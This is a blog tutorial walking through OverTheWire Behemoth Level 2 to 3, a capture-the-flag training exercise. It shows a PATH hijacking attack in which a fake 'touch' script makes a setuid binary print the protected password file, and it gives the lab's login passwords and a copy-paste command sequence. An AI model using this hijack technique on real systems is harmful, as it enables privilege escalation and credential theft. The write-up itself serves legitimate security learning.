---
date: 2023-08-31 00:00:00 +0700
layout: post-with-comments
title: "OverTheWire Behemoth Level 2 → 3 tutorial!!"
permalink: /posts/Over-The-Wire-Behemoth-Level-2-to-3/
tags: [overthewire, behemoth, exploitation, path-hijacking, priv-esc, walkthrough, ctf, linux, beginner]
description: "A step by step tutorial for OverTheWire Behemoth Level 2 → 3!!"
---

<!-- Scoped styles: only affect this post -->
<style>
  .behemoth-nav{display:flex;align-items:center;gap:.75rem;margin:.5rem 0 1.25rem;border-top:1px solid var(--border-color,#3a3a3a);padding-top:.75rem}
  .behemoth-nav .nav-left,.behemoth-nav .nav-center,.behemoth-nav .nav-right{flex:1}
  .behemoth-nav .nav-left{text-align:left}
  .behemoth-nav .nav-center{text-align:center}
  .behemoth-nav .nav-right{text-align:right}
  .behemoth-nav a{display:inline-block;padding:.45rem .8rem;border:1px solid var(--border-color,#3a3a3a);border-radius:.6rem;text-decoration:none;line-height:1}
  .behemoth-nav a:hover{transform:translateY(-1px)}
  .behemoth-nav .disabled{opacity:.55}
  :root[data-theme='light'] .behemoth-nav a{border-color:rgba(0,0,0,.15)}
</style>

<nav class="behemoth-nav" aria-label="Behemoth level navigation">
  <div class="nav-left">
    <a href="{{ '/posts/overTheWire-Behemoth-Level-1-to-2/' | relative_url }}">← Previous: Level 1 → 2</a>
  </div>

  <div class="nav-center">
    <a href="https://overthewire.org/wargames/behemoth/behemoth3.html" target="_blank" rel="noopener">
      Official (Level 3) ↗
    </a>
  </div>

  <div class="nav-right">
    <a href="{{ '/posts/overTheWire-Behemoth-Level-3-to-4/' | relative_url }}">Next: Level 3 → 4 →</a>
  </div>
</nav>

## Login

Log in as **behemoth2** using the password you obtained from Level 1 → 2.

```bash
ssh behemoth2@behemoth.labs.overthewire.org -p 2221
# password: eimahquuof
````

---

## Task

The binary **`/behemoth/behemoth2`** uses `system("touch <pid>")`.
Our goal is to hijack the program’s call to `touch` so that it runs our own script instead, revealing the password for **behemoth3**.

---

## A little bit of Theory

* `system()` looks up executables according to the **\$PATH** environment variable.
* If we put our own directory first in `$PATH` and create a fake `touch` binary, the program will execute ours.
* This is known as a **PATH hijacking attack**.
* Our fake `touch` just calls `cat /etc/behemoth_pass/behemoth3`.

---

## Solution

1. **Confirm program behavior with ltrace**

   ```bash
   ltrace ./behemoth2
   ```

   You’ll see a call like:

   ```
   system("touch 17924")
   ```

   confirming it tries to execute `touch`.

2. **Create a fake `touch`**

   ```bash
   mkdir /tmp/fake
   cd /tmp/fake
   echo "cat /etc/behemoth_pass/behemoth3" > touch
   chmod 777 touch
   ```

3. **Prepend our directory to PATH**

   ```bash
   export PATH=/tmp/fake:$PATH
   ```

4. **Run the vulnerable binary**

   ```bash
   /behemoth/behemoth2
   ```

   Since `$PATH` points to our fake script first, it executes our `touch`, which prints the next password.

---

## Password

> This is the password from my run; if yours differs, use the one your terminal printed.

```
nietiediel
```

---

## Troubleshooting

* **Still calling real touch** → Make sure `/tmp/fake` is the **first** entry in `$PATH`.
* **Permission denied** → Ensure your fake `touch` is executable (`chmod +x touch`).
* **No output** → Your fake script must only contain:
  `cat /etc/behemoth_pass/behemoth3`

---

## Copy-paste quick run (one shot)

```bash
ssh behemoth2@behemoth.labs.overthewire.org -p 2221
# password: eimahquuof

mkdir /tmp/fake && cd /tmp/fake
echo "cat /etc/behemoth_pass/behemoth3" > touch
chmod 777 touch
export PATH=/tmp/fake:$PATH

/behemoth/behemoth2
# → should print password for behemoth3
```

---

**Congrats 🎉** You hijacked the `system()` call by overriding `$PATH`, tricked the binary into running your fake `touch`, and obtained the password for **behemoth3**!

---

## Thanks for reading!

Until next time — **Otsumachi!!** 💖☄️✨

![Cinema]({{ '/assets/images/advice/cinema.gif' | relative_url }})

